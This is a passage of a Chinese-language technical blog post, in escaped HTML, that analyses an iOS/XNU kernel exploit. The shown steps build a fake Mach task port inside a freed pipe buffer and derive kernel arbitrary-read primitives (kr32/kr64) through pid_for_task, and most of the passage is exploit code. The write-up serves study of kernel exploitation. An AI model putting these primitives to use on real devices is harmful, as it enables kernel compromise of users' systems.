    &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;申请空间时的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kport_t&lt;/code&gt;为作者构造的一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_port&lt;/code&gt;结构体&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_references&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// spinlock&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_interlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_set_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_prepost_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seqno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;receiver_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgcount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;klist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_nsrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_pdrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_premsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_mscount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_sorights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们要做的，是将这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;的地址，替换到刚才被释放的内核缓冲区&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pipe_buffer&lt;/code&gt;里，这样整个内核缓冲区的布局就是：第一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节是我们&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;的地址，后面都是正常Port的地址&lt;/p&gt;

&lt;p&gt;先获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;的地址&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port_pipe_buffer&lt;/code&gt;，也就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port_fds&lt;/code&gt;对应的内核缓冲区&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_fg_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SMAP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_ofiles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f_fglob&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_FILEPROC_F_FGLOB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;port_fg_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_fglob&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_FILEGLOB_FG_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;port_pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fg_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_PIPE_BUFFER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] second pipe buffer: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fakeport-&amp;gt;ip_kobject&lt;/code&gt;指向的是结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task&lt;/code&gt;，这个结构体还没有进行初始化，到这里完成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;的内存数据构造&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将完成构造的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;数据刷到内核缓冲区里&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这是我们释放掉的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pipe_buffer&lt;/code&gt;，将第一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节替换为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port_pipe_buffer&lt;/code&gt;的地址，那么逻辑上第一个Port内核态地址指向的内核内存空间我们就可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port_fds&lt;/code&gt;来进行控制了&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;的用户态句柄，从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p&lt;/code&gt;中读出我们发送的OOL数据，第一个元素就是我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;，如同用户态传到内核态会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAST_MACH_NAME_TO_PORT&lt;/code&gt;将用户态句柄转换为内核态地址一样，内核态传到用户态会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAST_MACH_PORT_TO_NAME&lt;/code&gt;将内核态地址转换为用户态句柄&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;received_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;our_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// fake port!&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;于是我们现在拥有了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fake Task Port&lt;/code&gt;的用户态句柄和内核态地址&lt;/p&gt;

&lt;h2 id=&quot;8-填充vm_map&quot;&gt;8. 填充VM_MAP&lt;/h2&gt;

&lt;p&gt;作者在这里实现了两个内核任意读的原语，我们先来分析一下它背后的取值逻辑&lt;/p&gt;

&lt;p&gt;通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fake_task&lt;/code&gt;获取到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bsd_info&lt;/code&gt;赋值给指针变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_addr_ptr&lt;/code&gt;，宏&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kr32&lt;/code&gt;里重新设置指针变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_addr_ptr&lt;/code&gt;的值，再调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pid_for_task()&lt;/code&gt;，这逻辑完全看不懂什么意思&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_addr_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_BSD_INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    
&lt;span class=&quot;cp&quot;&gt;#define kr32(addr, value)\
    if (SMAP) {\
        read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);\
    }\
    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
    if (SMAP) {\
        write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);\
    }\
    value = 0x0;\
    ret = pid_for_task(our_port, (int *)&amp;amp;value);
&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read64_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define kr64(addr, value)\
    kr32(addr + 0x4, read64_tmp);\
    kr32(addr, value);\
    value = value | ((uint64_t)read64_tmp &amp;lt;&amp;lt; 32)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;顺着获取PID这个思路想一下，通过一个Port内核态地址来获取PID的方式如下&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset_bsd_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset_p_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bsd_info&lt;/code&gt;的值设置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addr - offset_p_pid&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addr&lt;/code&gt;为我们要读取数据的地址，可以看到此时获取的就是我们传入的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addr&lt;/code&gt;指向的数据&lt;/p&gt;

